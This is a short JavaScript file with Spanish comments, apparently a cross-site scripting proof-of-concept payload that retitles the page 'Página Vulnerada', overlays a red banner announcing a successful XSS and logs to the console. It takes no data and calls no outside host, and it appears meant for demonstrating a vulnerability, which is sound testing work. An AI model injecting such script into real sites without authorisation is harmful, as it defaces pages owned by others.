// 1. Cambia el título de la pestaña del navegador.
document.title = "Página Vulnerada";

// 2. Crea un nuevo elemento <div> para usarlo como un banner.
const banner = document.createElement('div');

// 3. Aplica estilos al banner para que sea muy visible.
banner.style.position = 'fixed';
banner.style.top = '10px';
banner.style.left = '50%';
banner.style.transform = 'translateX(-50%)';
banner.style.padding = '20px';
banner.style.backgroundColor = '#ff4757'; // Un color rojo llamativo
banner.style.color = 'white';
banner.style.fontSize = '24px';
banner.style.fontWeight = 'bold';
banner.style.borderRadius = '10px';
banner.style.boxShadow = '0 5px 15px rgba(0,0,0,0.5)';
banner.style.zIndex = '9999'; // Para que aparezca sobre todo lo demás

// 4. Añade el mensaje que se mostrará en el banner.
banner.innerHTML = '🚀 ¡XSS Exitoso! 🚀';

// 5. Finalmente, inserta el banner en la página web.
document.body.appendChild(banner);

// Opcional: Muestra un mensaje en la consola del navegador.
console.log("El script XSS externo se ha ejecutado correctamente.");